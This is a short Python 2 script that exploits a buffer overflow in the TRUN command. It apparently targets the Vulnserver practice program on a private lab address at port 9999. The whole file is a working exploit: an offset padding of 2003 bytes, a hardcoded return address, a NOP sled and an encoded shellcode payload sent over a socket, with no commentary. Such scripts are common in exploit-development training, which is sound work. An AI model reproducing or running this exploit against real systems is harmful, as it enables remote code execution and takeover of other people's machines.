#!/usr/bin/python
import sys, socket

overflow = (
"\xda\xca\xbf\xf0\x68\xfc\x09\xd9\x74\x24\xf4\x58\x2b\xc9\xb1"
"\x52\x31\x78\x17\x83\xc0\x04\x03\x88\x7b\x1e\xfc\x94\x94\x5c"
"\xff\x64\x65\x01\x89\x81\x54\x01\xed\xc2\xc7\xb1\x65\x86\xeb"
"\x3a\x2b\x32\x7f\x4e\xe4\x35\xc8\xe5\xd2\x78\xc9\x56\x26\x1b"
"\x49\xa5\x7b\xfb\x70\x66\x8e\xfa\xb5\x9b\x63\xae\x6e\xd7\xd6"
"\x5e\x1a\xad\xea\xd5\x50\x23\x6b\x0a\x20\x42\x5a\x9d\x3a\x1d"
"\x7c\x1c\xee\x15\x35\x06\xf3\x10\x8f\xbd\xc7\xef\x0e\x17\x16"
"\x0f\xbc\x56\x96\xe2\xbc\x9f\x11\x1d\xcb\xe9\x61\xa0\xcc\x2e"
"\x1b\x7e\x58\xb4\xbb\xf5\xfa\x10\x3d\xd9\x9d\xd3\x31\x96\xea"
"\xbb\x55\x29\x3e\xb0\x62\xa2\xc1\x16\xe3\xf0\xe5\xb2\xaf\xa3"
"\x84\xe3\x15\x05\xb8\xf3\xf5\xfa\x1c\x78\x1b\xee\x2c\x23\x74"
"\xc3\x1c\xdb\x84\x4b\x16\xa8\xb6\xd4\x8c\x26\xfb\x9d\x0a\xb1"
"\xfc\xb7\xeb\x2d\x03\x38\x0c\x64\xc0\x6c\x5c\x1e\xe1\x0c\x37"
"\xde\x0e\xd9\x98\x8e\xa0\xb2\x58\x7e\x01\x63\x31\x94\x8e\x5c"
"\x21\x97\x44\xf5\xc8\x62\x0f\x3a\xa4\x01\x4d\xd2\xb7\xd9\x70"
"\xaa\x31\x3f\x18\xbc\x17\xe8\xb5\x25\x32\x62\x27\xa9\xe8\x0f"
"\x67\x21\x1f\xf0\x26\xc2\x6a\xe2\xdf\x22\x21\x58\x49\x3c\x9f"
"\xf4\x15\xaf\x44\x04\x53\xcc\xd2\x53\x34\x22\x2b\x31\xa8\x1d"
"\x85\x27\x31\xfb\xee\xe3\xee\x38\xf0\xea\x63\x04\xd6\xfc\xbd"
"\x85\x52\xa8\x11\xd0\x0c\x06\xd4\x8a\xfe\xf0\x8e\x61\xa9\x94"
"\x57\x4a\x6a\xe2\x57\x87\x1c\x0a\xe9\x7e\x59\x35\xc6\x16\x6d"
"\x4e\x3a\x87\x92\x85\xfe\xa7\x70\x0f\x0b\x40\x2d\xda\xb6\x0d"
"\xce\x31\xf4\x2b\x4d\xb3\x85\xcf\x4d\xb6\x80\x94\xc9\x2b\xf9"
"\x85\xbf\x4b\xae\xa6\x95")

returnaddress = "\xaf\x11\x50\x62"

shellcode = "A" * 2003 + returnaddress + "\x90" * 32 + overflow

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.10.162',9999))

	s.send(('TRUN /.:/' + shellcode))
	s.close()

except:
	print "Error connecting to server"
	sys.exit()
